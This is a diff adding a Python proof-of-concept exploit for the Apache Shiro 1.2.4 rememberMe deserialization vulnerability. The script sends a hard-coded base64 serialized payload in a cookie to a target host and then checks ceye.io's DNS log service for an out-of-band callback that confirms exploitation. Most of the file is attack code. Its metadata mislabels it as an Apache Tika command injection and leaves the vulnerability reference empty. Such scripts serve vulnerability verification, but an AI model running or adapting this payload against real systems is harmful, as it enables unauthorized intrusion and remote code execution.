@@ -1,0 +1,58 @@
+#!/usr/bin/env python3
+#@author: badger
+#@date: 2019-10-21
+#
+import requests
+import time
+import sys
+
+class PoC(object):
+    name = "Apache Tika Remote Command Injection"
+    appName = "Apache Shiro"
+    appVersion = "1.2.4"
+    updateDate = "2019-10-21"
+    Plateform = "Multiple"
+    vulRefer = ""
+
+    def __init__(self, host, port, token):
+        self.host = str(host)
+        self.port = str(port)
+        self.cookie = "rememberMe=moOezwtpQ5GQ9sUj0PxmYOKJtiaqf8SKBKm3/p/zg2er8IE71HTmG5pnI5yM+X2VuDtrHjtdl9h2A5dWTjdP7ekZyAl/XrU866OI68XjzKHSpz/vWbYceFCp3XhyB6Z8pMYbwlNmXL/Dc8MSR63Vq7ZhXt2zhDNhfnfNY6UBzD9YJjW0Ju8PPIJONh0XvgAexXxdDc3o1v9ziRHIBme6x9xSu/EXbwCjaug8nvyK4QeaNJurM5vw8jljU/xHASyQ+FfCC6fvqhs8CGGkxZIQ9JkeKp0256peYHXa/PfGtvGTZ/3uVAQ4xnI6fHQhzgmfXIk6ewmRdNTV7aJq4OkO6dGtMaGmx70OaqykGhA4AHnyW1/lepA+iKzfBaBka48lw93XxU8kz47mQLE1CX6CLJfy1knXmPfohnFs2S7h5caQ/+o5mdutNrEWiELlxJMVeUBTaRxSNjVKXESGfXJONn8hAFtFxUbB19MYovMOWhA5Fck78Bvi6f3iiPYQ/A7ntyfbhoFipO+PS2fX701qGHInysH3zyrq9+Mh9+s00yXKHDTFcX0g1dgxFmLlHP9eMOrTXR3avVGftncwIKF4v3uX++DRTWV/Ky6QV8Os4dh/z8Wy+scwbxHVydiofDfju81lNvoHov0+MW3Lrp9F76JykUjk1LA6RzT9D5I0DsJFZXW6Y9xv0V2A57OIUFUYTbbmXwWXld85UY2IPhc2wDBXB+I3jwt84OLQQZrwBLthW13AfcbOswZQahFm09gxB1r6WX+uhhs+2WreS7/Boe6aP5F6h5Es9nJHOP7KgoLWgoj3MeF923WqYXPG5e6tJZ/C8sIQHhKHzw1JYFE+GCvNa2vCWR7gZ3VbqRiFei1uJp/iAvt176lBXMpLTHuimEVg6TewOb8ikI0uw/47vzKRXEmSq9KKL7CLLmG7B3RLlwQ3WT1724aT6kUzNt3fLrLRwGECMEAOdygW+iE3b+ozL6KhjzCczHPHv2R5KKavdvRfpIPGUToE+k49gI9vdPs1vZkDgyx2UtR1YSDvTHyo3HKqMVy0hmBzJXAfxAvnQ0md5PphHYFzGuy0/JGtj59QJIL9R342vzuRnfFhr+b9mhKx3kkLoSebfbvVR7JrilVZjNblCpXENGv36SekuM1b65qJOqz2t/VHaC2QAhmSPehJ1myNBb3qK0T6XcMC3i0S02mwYZd83J604W2koXf6nznwIt8pXjv29Bum/jWYalKr50xkGe9+0FkKqU0/JFwN5RfvmSnWs1sSnH/T9AyGEiz0JIdXeyFk9gtPiJCcTdw6PommxDDcVRRiC6EGU7LciuI1q1o2L/40WYOXP5YHeCT/bNiMzm8LtUKtNfjTZqIs23qQRuMWD3QzoAzWDy+S616WDdL6wg0NCvVVEYhT4aBy1FfIf9EvyaOypmXhR728GLEQKlNQJhxO0OJImNBuufJCt0OeUumIWrDpZGSNc5SEiGDyROolgqbvQK8c1Ja1JUI6HCNFkg6HW+cU/ww/TASrPLjopANqXOtTkBuEDD2vkwmDxzJW0QkWvrzhzmNEkRxDq21zBvKtepCHPQFMRqylw/fk3L0iNmN5K4TDLQLeCbz44HU4U/ZRaqR8PJPus109N8WfSq1RHjOh1RFGygl+ydqUuwCr1EUcXhH++taiQ5Db9rWHHe83BgS05KQLTfw37CjCfxZo2qzHamQVMTzstbAeK6w+B+tyV+zVBxHF4fpFsgsu02+ZUWfgjUbWp13NdTER7rTrxcCg0bjW6fS35XsRMeA6vW/3VN68rlKv/Y0dJOEu+0z3dJDaMBqAJxpfnNnjSSRW99nbsOAegMOb2xfTXjnuUe+OyMpE9YEfijW79O7cHjL9v2MPGn+LO3nOSqtaeCqO2bY8Ms6rKau9fOcRDHplHzarBB320rN4EYl6MDOWPFuUTL4oxgoG1Yr/BUEoz8LHfu/vjiDYcNYkECOcH+INDO4/x4ZKTeRmQUBuIV0kVVUlkZUOEVwXGh5mNYp0eXnkFMAVcXQOIeFJy9LF+twy0rYuc6dgwJz59AJ/ltFPYv7NVeXP9SgGLlnJAJo0amtpCmbg94fviSqLTXCBWJl6qcMeNYXssQ8qxmS9C4IsuLZtuEoHKII8f9HIZsLoxHiM+Z8TfiQOuM0nbIC7Va6YTuSPUdy0/KyvOUm6gytzWSSPlf5U229Aa97h9yvuUdkh6m20EynE9XU51at8f9lxgdQtboM8/2QIz4qKSfPv/7aRGoMgaJbUtBDrpb2emc5PiuvQEBFixO7zUc3LopHEp/lgtSPC643DTboKdHrP0w458S2dWVqGvQ7M+HAvqqTxfz7WVtNvyFW7HKI2MMCcNnn/JNRGpdOARMjh0nEHUszIQRdkSLtHxvbgRrK+n+msc56d+m30M9OW5Wp3pfzO+z4LWtn91zcQ4r0tisDwLNJs02S3gfYEFARGl443RrzNTyVEiB6jbuLzhvsQGrE9Dm7GAjffOedpGFFOdt46KJBlGWp3TH36rigdD01/Nl9rTgy/QqOzyR4u34s3Trte1hv6TdzavYvpa7Y0yA0mjriCuTS1v1RM2sPv57K8GCmKEgF6hZy4c3L7hcoRkg2iZoQV78nH8joek9Lp6G2QUSzGep38xCYxgu7CsTE7+y519BgsW+X3w2NwT6fjrsf5Mp5OXf3WmfgVYqDoe/rlH0rekDnAuMuqgu65lR9F/VgWM70cb6pZvNVYBxZ6AIwmG1Ive9Xoj47vJB03FdDmPeGofVO6bVOjYpuUE/dKIUNtbPQ3uFXUz4Ejlmh4sYr2ZbzYpzNgnyMsFzWg8zd9Vf7Pd8Nah5L0hHY8f+nuA+wZuD6AbZLnsZt/Iz61H5uk6kbAX/ksBADA3w5GulPpC+olAmLv5i2aTP0cEeppi2Hti+XkpG3Z6lviA37Jaaina7W5XfFI+hWKevvrVOZybal/IHO0q0WnLGuMpXbiHmmoA7no+kVkvZrNVvu+S4Mn3QT7FhZVxOG9KZbJn9V3wEODinqN0CLV7RaXf6iQo6uCx74YBVm/GAO6CQ8AzVbqOkhb5GWPxYisI6eGEr6BrjvxLeMCQNM+Vm8UyvYDUdnzMj+a/z7r0UIKh4Tz/A2rpHVXJ+X/piMChdo+TQzAgAa0NJmjxHNKhXlXISyKINK2agH3PMuQrB6bp+nugh6Tgnme3idIe80GgaCcmkGwhvXeSPOAXJOfd2VedCsGZNpe0QT97WXckt+ayPmh6cKTlSPFm6wAkTHiZA9MVl6njlMPqgNxUbUfy3mVoG54cOf/wwPa/vMgXEHZbgKlda7W4RD0koKPdopahUQ8xPl48vkuZw4VYOQh2wzj8pkKN4+3TEIRd0G3Xo8xmWHuqHcPobCRvAe/8psmYsN4rZkpEckf/QSewL9dU4qQtev2svCAWJgQHYt0X1OJTSr93gUUwuAztc/F+20+NYRqEbmmUK0loZM2Ym73YG+zjbN77StCwNz0wmM5AnGfnn7sqiTc2rKE9SYfpPqedER7xrYk5AuWPBioR4iRiXLOxjQiMSKquQxPrvU9L8DxlcH3mKuzuktQutDiroRG3EjjwtNFgubDmsfRyY+pyfFh7IfQdcpxXyCaC1yq85dxXGSnWrQ8+4kQJ8vm/5PgDhjl3D9zXsTbOXRrG+yvh5UyuEEnMZ0/pu3dV5ak2d7GGoNBSfrTipkxcCPf+5YFr5fHnkRe5Mg2G7YwSMwEroQh3BvwKJb+qsBloVBYKLrPyYSLqDn+Ukni+1TTL2bMMEDO+bNDlxQv+5SjFls3SFakEEBEPVHfq5PI6/cRhfW/CB3md1JVe4E0hb1kLX22Y7ZkCLbw7kkdLlCx7f/LGXASbBUqrB5wa72+WB59mRdxQ9AL3rOyDdJvFHxv1MO51F32U7SsRI7Yd77X5gmex63125cy+Tw1G9Zj3pV1JQ5f7YREZexrIF7etCF7r/XNuLjNAGb7j6UwJ60XrK7UeFDmxk4iasw/lOwpTC97GiRuMV9JgGQg4d8PQlaCcpPPzbC1s+CfIRMC4eVjtFT0aGY79RbGxq6JZQoAyUOzV3Zw0CfvRGjEidugqrcM2HHK8WkdOYyxTnmMREV8+LvKP+dmu0R76U3IzDWkci0A8fzjLWqd4YlcjjwPPF6PtwGGX4CdAqex8ihYL2aCfj35Ogpo6IdFYgJ/gEI2DrXPW0Arl7czkLGMdWp6PRnuqpqvL6Ko1mvcCzBATA=="
+        self.token = token
+
+    def _pushdata(self):
+        veri_url = self.host + ':' + self.port + "/account"
+        headers = {"User-Agent": "Mozilla/5.0", "Cookie": self.cookie}
+        try:
+            requests.get("https://"+veri_url, headers=headers, verify=False)
+        except Exception as e:
+            try:
+                requests.get("http://"+veri_url, headers=headers, verify=False)
+            except Exception as e:
+                print("Something went wrong.\nUsage: python Shiro_1.2.4.py <host> <port> <token>")
+
+    def _check(self):
+        self._pushdata()
+        time.sleep(2)
+        check_url = "http://api.ceye.io/v1/records?token={}&type=dns&filter=shiro".format(self.token)
+        res = requests.get(url=check_url)
+        if "shiro_serialize" in res.text:
+            print("The target is vulnerable to {}.".format(self.vulRefer))
+            return True
+        else:
+            print("The target seem not vulnerable to {}".format(self.vulRefer))
+            return False
+
+if __name__ == '__main__':
+    try:
+        host = sys.argv[1]
+        port = sys.argv[2]
+        token = sys.argv[3]
+    except Exception as e:
+        print("Usage: python Shiro_1.2.4.py <host> <port> <token>")
+        print("Example: python Shiro_1.2.4.py localhost 8080 abcdefghijklmn")
+        exit(-1)
+    finally:
+        print("This poc need you regenerate your own shellcode.")
+    poc = PoC(host, port, token)
+    poc._check()
